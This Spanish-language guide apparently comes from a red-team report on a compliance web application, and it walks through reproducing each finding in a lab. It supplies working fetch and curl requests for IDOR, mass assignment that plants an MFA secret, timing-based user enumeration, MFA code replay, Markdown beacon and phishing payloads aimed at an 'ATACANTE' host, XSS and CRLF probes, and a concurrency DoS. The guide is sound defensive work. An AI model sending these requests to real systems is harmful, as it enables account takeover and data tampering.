# Cómo reproducir cada hallazgo paso a paso

Guía para **verificar** cada hallazgo confirmado desde la perspectiva de un usuario común
(rol `DUENO_UNIDAD`/`LECTOR`/`RSI`), sin acceso a la base de datos ni al servidor. Todo se probó
contra una instancia de laboratorio con datos sintéticos. Para los detalles técnicos y la causa
raíz ver [03-hallazgos-analisis-estatico.md](03-hallazgos-analisis-estatico.md),
[10-rt03-rt07-rt12.md](10-rt03-rt07-rt12.md) y [09-rt11-osint-gitleaks.md](09-rt11-osint-gitleaks.md).

> **Ámbito y ética.** Hacerlo solo contra tu propia instancia de laboratorio (Proxmox del informe o
> el lab de Vagrant en [../lab/](../lab/)), con datos sintéticos. Al terminar, revertir todo (ver
> [§ Limpieza](#limpieza)).

---

## 0. Preparación

### 0.1 Entorno

- **Levantar la víctima.** Usar el lab reproducible de [../lab/](../lab/) (`vagrant up` →
  `https://192.168.56.10:8443`) o la VM del informe. La equivalencia Proxmox ↔ Vagrant está en
  [../lab/README.md](../lab/README.md): solo cambia la IP/credenciales.
- **Usuarios.** El seed crea la organización demo y los trabajadores; las cuentas de rol bajo
  (`DUENO_UNIDAD`, `RSI`, `LECTOR`) se crean desde el panel de administración, vinculadas a esos
  trabajadores. Credenciales y correos de referencia en
  [02-credenciales.md](02-credenciales.md) (redactadas).
- A lo largo de la guía, `<HOST>` es el host:puerto de tu instancia (p. ej. `192.168.56.10:8443`).

### 0.2 Dos formas de ejecutar las pruebas

Cada hallazgo se puede reproducir de dos maneras equivalentes:

- **(A) Consola del navegador** — la más fiel al "usuario común": iniciás sesión normalmente y
  disparás los pedidos con `fetch`, reutilizando tu cookie de sesión.
- **(B) Terminal con `curl`** — más cómoda para scripts, timing y concurrencia (la usamos para
  H4, RT-12). Requiere capturar la cookie de sesión en un archivo.

Elegí una. Ambas se explican abajo.

### 0.3 Autenticación

La cookie de sesión es `__Host-rsi_session`, marcada `HttpOnly`: **no** se lee desde JavaScript,
pero el navegador la adjunta sola a cada pedido del mismo origen (eso también satisface la
validación de `Origin` del backend).

**(A) Consola.** Logueate en la app con la cuenta del rol que pide el hallazgo y pegá este helper
una vez en la consola (F12 → **Console**):

```js
const API = location.origin + '/api/v1';
// Devuelve el status y loguea la respuesta.
async function api(metodo, ruta, cuerpo) {
  const r = await fetch(API + ruta, {
    method: metodo, credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: cuerpo ? JSON.stringify(cuerpo) : undefined,
  });
  const texto = await r.text();
  console.log(metodo, ruta, '→', r.status);
  try { console.log(JSON.parse(texto)); } catch { console.log(texto); }
  return r.status;
}
// Igual que api(), pero DEVUELVE el JSON (se usa en el reconocimiento).
async function apiJson(metodo, ruta, cuerpo) {
  const r = await fetch(API + ruta, {
    method: metodo, credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: cuerpo ? JSON.stringify(cuerpo) : undefined,
  });
  try { return await r.json(); } catch { return null; }
}
```

**(B) Terminal.** Login guardando la cookie en un *jar* y reutilizándola después:

```bash
HOST="192.168.56.10:8443"; JAR="$(mktemp)"
c() { curl -sk -c "$JAR" -b "$JAR" -H "Origin: https://$HOST" "$@"; }

# Rol bajo (sin MFA):
c -X POST "https://$HOST/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"correo":"<CORREO_DUENO>","password":"<PASSWORD>"}' -o /dev/null -w "login %{http_code}\n"
```

Para `ADMINISTRADOR`/`RSI` (MFA obligatorio) hay que agregar `codigoMfa`. Generar el TOTP desde el
secreto de enrolamiento:

```bash
python3 -c "
import base64,hmac,hashlib,struct,time
s='<SECRETO_TOTP_BASE32>'.upper()
c=struct.pack('>Q', int(time.time())//30)
h=hmac.new(base64.b32decode(s),c,hashlib.sha1).digest(); o=h[-1]&15
print(str((struct.unpack('>I',h[o:o+4])[0]&0x7fffffff)%1000000).zfill(6))"
# luego: -d '{"correo":"<ADMIN>","password":"<PW>","codigoMfa":"<CODIGO>"}'
```

### 0.4 Reconocimiento: obtener los IDs que usan las pruebas

Varias pruebas necesitan IDs de recursos **ajenos** a la unidad del usuario. Un rol bajo los
obtiene de forma legítima (los listados no filtran por alcance — ese es justamente el Hallazgo 9).
Pegá esto en la consola **logueado como `DUENO_UNIDAD`** y te deja las variables listas:

```js
// (a) Todas las organizaciones del sistema — este listado NO filtra por alcance (H9)
const orgs = await apiJson('GET', '/organizaciones');
console.table(orgs.map(o => ({ id: o.id, nombre: o.nombre })));

// (b) Tu identidad y alcance real
const me = await apiJson('GET', '/auth/me');
const miOrg = me.organizacionId, miUnidad = me.unidadOrganizativaId;

// (c) Una ORGANIZACIÓN ajena (otra distinta a la tuya) — para H1 (nivel org) y H2d
const orgAjena = orgs.find(o => o.id !== miOrg);

// (d) unidadAjena = otra unidad de TU MISMA organización (no la que administrás).
//     Ojo: listar unidades de una organización AJENA da 403 (ese endpoint SÍ está scopeado);
//     H1 se demuestra sobre una unidad "hermana" dentro de tu propia organización.
const unidades = await apiJson('GET', `/organizaciones/${miOrg}/unidades`);
const unidadAjena = unidades.find(u => u.id !== miUnidad);

// (e) activoAjeno = un activo que NO está en tu unidad (si la instancia tiene uno)
const activos = await apiJson('GET', '/seguridad/activos');
const activoAjeno = activos.find(a => a.unidadOrganizativaId !== miUnidad);

// (f) hitoAjeno = un hito de un plan (H2c). El caso cross-org real necesita un hito en OTRA
//     organización: si la instancia no lo tiene, hay que sembrarlo (ver nota abajo).
const planes = await apiJson('GET', '/cumplimiento/planes');
const hitos = planes.length ? await apiJson('GET', `/cumplimiento/planes/${planes[0].id}/hitos`) : [];
const hitoAjeno = hitos[0];

console.log({ miOrg, miUnidad, orgAjena: orgAjena?.id, unidadAjena: unidadAjena?.id,
              activoAjeno: activoAjeno?.id, hitoAjeno: hitoAjeno?.id });
```

A partir de acá, los ejemplos usan esas variables (`miOrg`, `orgAjena`, `unidadAjena`,
`activoAjeno`, `hitoAjeno`). Si preferís la terminal, copiá los IDs que imprime `console.log`.

> **Nota sobre datos.** Los IDOR sobre objetos (`activoAjeno` para H2, `hitoAjeno` en otra org
> para H2c) necesitan que exista un objeto fuera de tu alcance. Si la instancia tiene pocos datos
> (p. ej. un solo activo, en tu propia unidad), `activoAjeno`/`hitoAjeno` quedan `undefined`: hay
> que **sembrar** ese objeto primero con una cuenta `ADMINISTRADOR` (o directamente en la base del
> laboratorio). H1, H9, H10, H11 no dependen de esto.

---

## Hallazgo 1 — Edición de unidades/organización fuera del alcance propio

**Rol:** `DUENO_UNIDAD`. **Esperado si estuviera corregido:** `403` en los tres pasos.

```js
// 1. Leer una unidad ajena (debería dar 403, responde 200)
await api('GET', `/organizaciones/unidades/${unidadAjena.id}`);
// 2. Renombrar esa unidad ajena  (guardá antes unidadAjena.nombre para revertir)
await api('PATCH', `/organizaciones/unidades/${unidadAjena.id}`, { nombre: 'prueba-acceso' });
// 3. Modificar el alcance SGSI de toda la organización ajena
await api('PATCH', `/organizaciones/${orgAjena.id}`, { alcanceSgsi: 'prueba-acceso' });
```

**Vulnerable:** los tres responden `200`/`201` y el cambio queda guardado.
**Revertir:** repetir el `PATCH` con el `nombre`/`alcanceSgsi` original (ver [§ Limpieza](#limpieza)).

---

## Hallazgo 2 / 2b — Crear riesgos/incidentes sobre activos de otra unidad (IDOR)

**Rol:** `DUENO_UNIDAD`. **Esperado si estuviera corregido:** `403` (validar que `activoId` esté en el alcance).

```js
await api('POST', '/seguridad/riesgos', {
  activoId: activoAjeno.id, nombre: '[PRUEBA-RT] idor', probabilidad: 3, impacto: 3, estado: 'IDENTIFICADO'
});
await api('POST', '/seguridad/incidentes', {
  activoId: activoAjeno.id, titulo: '[PRUEBA-RT] idor', severidad: 'ALTA'
});
```

**Vulnerable:** `201`; se crea el registro sobre un activo de otra unidad (y la respuesta devuelve
datos del activo ajeno). **Revertir:** el `DELETE` propio da `403`, así que pedir a un admin que
borre los registros `[PRUEBA-RT]`.

---

## Hallazgo 2c — Editar/borrar hitos de un plan de otra organización

**Rol:** `DUENO_UNIDAD`. **Esperado:** `403` en `PATCH`/`DELETE`.

```js
await api('PATCH', `/cumplimiento/hitos/${hitoAjeno.id}`, { nombre: '[PRUEBA-RT] acceso' });
await api('DELETE', `/cumplimiento/hitos/${hitoAjeno.id}`);
```

**Vulnerable:** ambos `200`. (Crear/listar por `/cumplimiento/planes/<id>/hitos` sí da `403` — la
falla está solo en las rutas directas `/hitos/:id`.) Si vas a probar el `DELETE`, hacelo sobre un
hito que puedas recrear, o omití ese paso para no perder datos del seed.

---

## Hallazgo 2d — Rol RSI accede a datos de otra organización (URCDP)

**Rol:** `RSI`. **Contexto:** aplica si el despliegue aloja **más de una** organización. **Esperado:** `403`.

```js
// orgAjena.id = una organización que NO es la del RSI (obtenida en el reconocimiento)
await api('GET', `/exportaciones/organizaciones/${orgAjena.id}/urcdp`);
```

**Vulnerable:** `200` con las bases de datos personales (registro URCDP) de la otra organización;
también se pueden modificar con `PUT` sobre
`/exportaciones/organizaciones/${orgAjena.id}/urcdp/bases-personales/<fichaId>`. Es el hallazgo de
mayor peso regulatorio (Ley 18.331).

---

## Hallazgo 3 — Mass assignment: escribir campos protegidos de cualquier usuario

**Rol:** `ADMINISTRADOR` (requiere MFA; ver §0.3). Es el de mayor impacto (backdoor de MFA/contraseña).

```js
// usuarioObjetivo = ID de cualquier usuario (p. ej. el del LECTOR)
await api('PATCH', '/auth/usuarios/<ID_USUARIO>', { mfaConfirmado: true });
// variante backdoor: { mfaSecret: '<semilla base32 conocida>', mfaConfirmado: true }
```

**Vulnerable:** `200`. El backend persiste campos fuera del DTO (`mfaConfirmado`, `mfaSecret`,
`passwordHash`) porque el body se pasa crudo a la base. La respuesta los oculta por el `select`,
pero el cambio se guarda — en el laboratorio se verificó consultando la DB:

```bash
# dentro de la VM (vagrant ssh), inspeccionar el usuario:
sudo docker exec -it sistema-rsi-postgres psql -U rsi -d rsi \
  -c "select correo, \"mfaConfirmado\", (\"mfaSecret\" is not null) as tiene_secret from \"Usuario\" where correo='<CORREO>';"
```

**Revertir:** `PATCH` del mismo usuario a `{ mfaConfirmado: false }` y, en DB, `mfaSecret = NULL`
(o re-seed). **Esperado si estuviera corregido:** `ValidationPipe` con `whitelist`/`forbidNonWhitelisted` ignora esos campos.

---

## Hallazgo 4 — Enumeración de usuarios por tiempo de respuesta

**Rol:** ninguno (sin autenticar). **Terminal:**

```bash
# Correo que EXISTE (password incorrecta) — el backend verifica el hash
curl -k -s -o /dev/null -w "existe:   %{time_total}s\n" -X POST "https://$HOST/api/v1/auth/login" \
  -H 'Content-Type: application/json' -H "Origin: https://$HOST" \
  -d '{"correo":"<CORREO_EXISTENTE>","password":"x"}'
# Correo que NO existe
curl -k -s -o /dev/null -w "noexiste: %{time_total}s\n" -X POST "https://$HOST/api/v1/auth/login" \
  -H 'Content-Type: application/json' -H "Origin: https://$HOST" \
  -d '{"correo":"noexiste@ejemplo.com","password":"x"}'
```

**Vulnerable:** el correo existente tarda ~0.5 s; el inexistente, ~0.02 s. **Nota:** nginx limita
~5 intentos/min por IP (`429`), así que espaciá las pruebas. **Esperado:** tiempos iguales (hash señuelo).

---

## Hallazgo 4b — Replay de un código MFA

**Rol:** una cuenta con MFA activado. Usar el **mismo** código de 6 dígitos dos veces seguidas
(dentro del mismo intervalo de ~30 s):

```bash
COD="<codigo_totp_actual>"
for i in 1 2; do
  curl -sk -X POST "https://$HOST/api/v1/auth/login" -H 'Content-Type: application/json' \
    -H "Origin: https://$HOST" -d "{\"correo\":\"<ADMIN>\",\"password\":\"<PW>\",\"codigoMfa\":\"$COD\"}" \
    -o /dev/null -w "login $i: %{http_code}\n"
done
```

**Vulnerable:** ambos `201` (dos sesiones válidas con el mismo código). **Esperado:** el segundo uso debe dar error (anti-replay por usuario/intervalo).

---

## Hallazgo 9 — Listar todas las organizaciones del sistema

**Rol:** `DUENO_UNIDAD`/`LECTOR`.

```js
await api('GET', '/organizaciones');
```

**Vulnerable:** devuelve **todas** las organizaciones (nombre, alcance, perfil), no solo la propia. Relevante en multi-organización. **Esperado:** limitar a la organización del usuario.

---

## Hallazgo 10 — Crear un proceso "huérfano" sin organización

**Rol:** `DUENO_UNIDAD`.

```js
await api('POST', '/organizaciones/procesos', { nombre: '[PRUEBA-RT] proceso-sin-org' });
```

**Vulnerable:** `201`, crea un proceso con `organizacionId: null`. (Enviar un `organizacionId`
ajeno sí da `403` — el agujero es **omitirlo**.) **Revertir:** un admin borra el proceso
(`DELETE /organizaciones/procesos/<id>`).

---

## Hallazgo 11 — Auto-aprobar/aceptar un riesgo propio

**Rol:** `DUENO_UNIDAD`.

```js
// riesgoPropio = un riesgo de la unidad del usuario
const mios = await apiJson('GET', '/seguridad/riesgos');
const riesgoPropio = mios[0];
await api('PATCH', `/seguridad/riesgos/${riesgoPropio.id}`, { estado: 'APROBADA', aceptado: true });
await api('GET', `/seguridad/riesgos/${riesgoPropio.id}`);   // verificar
```

**Vulnerable:** `200`; queda `APROBADA`/`aceptado:true` sin pasar por un rol de aprobación, y
`estado` admite texto libre. **Revertir:** `PATCH` al estado original. **Esperado:** la aprobación debe exigir el rol correspondiente y `estado` validarse contra un conjunto cerrado.

---

## RT-03 (Markdown injection en exportadores) — **confirmado, medio**

**Rol:** `DUENO_UNIDAD`/`RSI` (cualquiera que pueda crear una política y exportar). La función de
escape de los exportadores neutraliza `&<>`/CRLF pero **no** la sintaxis Markdown `[]()`.

```js
// 1. Crear una política con payload Markdown en la descripción (en TU propia organización)
await api('POST', `/cumplimiento/politicas/${miOrg}`, {
  titulo: '[PRUEBA-RT] md', estado: 'BORRADOR', version: '1.0',
  descripcion: 'texto ![x](https://ATACANTE/beacon.png) y [link](https://ATACANTE/phish)'
});
// 2. Exportar el documento y observar el payload sin escapar
await api('GET', `/exportaciones/organizaciones/${miOrg}/politica-seguridad`);
```

**Vulnerable:** el `![imagen](url)`/`[link](url)` viaja **íntegro** al documento exportado
(Markdown). Abierto en un visor que renderiza Markdown, la imagen remota actúa como **beacon**
(exfiltración pasiva / confirmación de apertura) y el link como **phishing** dentro de un documento
oficial (SoA, política, inventario). **Revertir:** borrar la política `[PRUEBA-RT]`
(`DELETE /cumplimiento/politicas/<id>`). **Esperado:** escapar también `[]()` o renderizar como texto plano.

---

## RT-04 (XSS persistente) — **descartado con fuzzing activo**

**Rol:** `DUENO_UNIDAD` para plantar; cualquier rol para visualizar. Objetivo: comprobar que el
payload almacenado **no** se ejecuta.

```js
// 1. Plantar una batería de payloads en una política
const xss = `[PRUEBA-RT] <script>alert('xss')</script> <img src=x onerror=alert(document.domain)> <svg onload=alert(1)>`;
await api('POST', `/cumplimiento/politicas/${miOrg}`, { titulo: xss, descripcion: xss, version: '1.0', estado: 'BORRADOR' });
```

2. **Verificar en el navegador:** ir a **Cumplimiento → Políticas**, abrir **F12 → Console** y la
   pestaña **Inspector**, y observar la tarjeta `[PRUEBA-RT]`.

**Resultado (no explotable):** **no** salta ningún `alert()`; en el Inspector el payload figura
como **nodo de texto** dentro del `<h3>`/`<p>` (los `<` escapados a `&lt;`), no como elementos
reales. Doble capa: React escapa todo texto interpolado **+** CSP `script-src 'self'` sin
`unsafe-inline`. El backend guarda verbatim (no sanitiza), pero no hay sink de HTML. Evidencia en
[evidencia/rt04-xss/](evidencia/rt04-xss/). **Revertir:** borrar la política `[PRUEBA-RT]`.

---

## RT-07 (log injection) — **descartado**

**Rol:** cualquiera. Inyectar CRLF en un query string y revisar el log crudo de nginx:

```bash
c "https://$HOST/api/v1/seguridad/riesgos?estado=FORJADO%0d%0a<linea-de-log-falsa>" -o /dev/null -w "%{http_code}\n"
```

Luego, dentro de la VM:

```bash
sudo docker logs sistema-rsi-frontend 2>&1 | tail -5 | cat -A   # ver caracteres de control
```

**Resultado (no explotable):** nginx registra el `%0d%0a` **literal, sin decodificar, en una sola
línea** (no parte el log ni inyecta una entrada falsa). Además el backend no tiene un sink de
logging de aplicación que reciba el valor. Sin envenenamiento de logs.

---

## RT-11 (OSINT del repositorio) — **sin secretos reales**

**Rol:** acceso al repositorio (no necesita la app). Sobre el clon del código:

```bash
gitleaks detect --source . --no-banner                 # historial completo
git log --all -p | grep -nE 'BEGIN .*PRIVATE KEY|AKIA[0-9A-Z]{16}|-----BEGIN'   # verificación manual
git log --all --name-only --pretty=format: | grep -E '\.env' | sort -u          # .env trackeados
```

**Resultado:** los hallazgos de gitleaks son falsos positivos (secreto TOTP de prueba RFC 6238,
ejemplos de documentación); solo `.env.example` quedó trackeado; 0 claves privadas. Detalle en
[09-rt11-osint-gitleaks.md](09-rt11-osint-gitleaks.md).

---

## RT-12 (DoS acotado del exportador) — **confirmado, acotado a propósito**

**Rol:** `DUENO_UNIDAD`/`RSI`. Los exportadores no paginan (`take`/`skip`). **Terminal:**

```bash
# 1. Línea base (un export secuencial)
curl -sk -o /dev/null -w "base: %{time_total}s\n" -b "$JAR" \
  "https://$HOST/api/v1/exportaciones/organizaciones/<ORG_ID>/inventario-activos"

# 2. 10 exports concurrentes al mismo endpoint (carga ACOTADA — no sostener)
for i in $(seq 10); do
  curl -sk -o /dev/null -w "%{time_total}s\n" -b "$JAR" \
    "https://$HOST/api/v1/exportaciones/organizaciones/<ORG_ID>/inventario-activos" &
done; wait
```

**Vulnerable:** la latencia por request se multiplica ~10× bajo concurrencia (≈0.1 s → ≈1 s),
confirmando contención de recursos. **Acotado a propósito:** no se escaló más para no degradar el
laboratorio; no se forzó una caída real. **Esperado:** paginación/límite en los exportadores y un
`limit_req` específico para `/exportaciones/*`.

---

## Limpieza

Revertir **todo** lo generado durante las pruebas, en esta instancia de laboratorio:

- **H1 / H11:** `PATCH` de vuelta a los valores originales (unidad, `alcanceSgsi`, estado del riesgo).
- **H2 / H2b / RT-03 / RT-04:** borrar los registros `[PRUEBA-RT]` (riesgos, incidentes, políticas).
  El `DELETE` del propio `DUENO_UNIDAD` puede dar `403` (por el hallazgo); en ese caso borrar con un
  admin o directamente en la DB.
- **H3:** restaurar `mfaConfirmado=false` y `mfaSecret=NULL` del usuario tocado.
- **H10:** borrar el proceso huérfano (`DELETE /organizaciones/procesos/<id>`, con admin).
- **RT-12:** borrar cualquier activo/unidad sintéticos creados para medir.

Comprobar que el inventario y los listados vuelven al estado del seed. En el lab de Vagrant, la vía
más limpia ante la duda es `vagrant destroy && vagrant up` (re-seed completo).

---

## Comprobaciones negativas (controles que SÍ funcionan)

Estas pruebas deben **fallar** (y fallan) — confirman que el problema es acotado:

```js
await api('PATCH', `/organizaciones/unidades/${unidadAjena.id}`, { nombre: 'x' }); // como LECTOR → 403 (ReadOnlyGuard)
await api('PATCH', '/auth/usuarios/<ID_PROPIO>', { rol: 'ADMINISTRADOR' });        // como DUENO → 403 (RolesGuard)
await api('GET',  '/seguridad/activos/<ID_ACTIVO_AJENO>');                          // detalle ajeno → 403 (alcance en GET :id)
await api('GET',  `/organizaciones/${orgAjena.id}/unidades`);                       // unidades de OTRA org → 403 (sí scopeado)
```

`403` en los cuatro: la escritura de solo-lectura, la escalada vertical de rol, la lectura de
detalle fuera de alcance y el listado de unidades de **otra organización** están correctamente
bloqueados. Contraste importante: **`GET /organizaciones` (la lista de orgs) NO está scopeado**
(H9), pero **`GET /organizaciones/:id/unidades` SÍ** (da 403) — por eso en el reconocimiento la
`unidadAjena` se toma de tu propia organización, no de una ajena.

> **Verificación.** Todos estos pasos se ejecutaron contra la instancia viva el 2026-11-04 y dieron
> el resultado indicado (incluidos H3/H2d/H4b con sesiones `ADMINISTRADOR`/`RSI`). El entorno se
> restauró al terminar: datos de prueba `[PRUEBA-RT]` eliminados y campos modificados revertidos.

El problema es específicamente el **alcance horizontal** entre unidades/organizaciones (en
creación/IDOR) y el **mass assignment**.
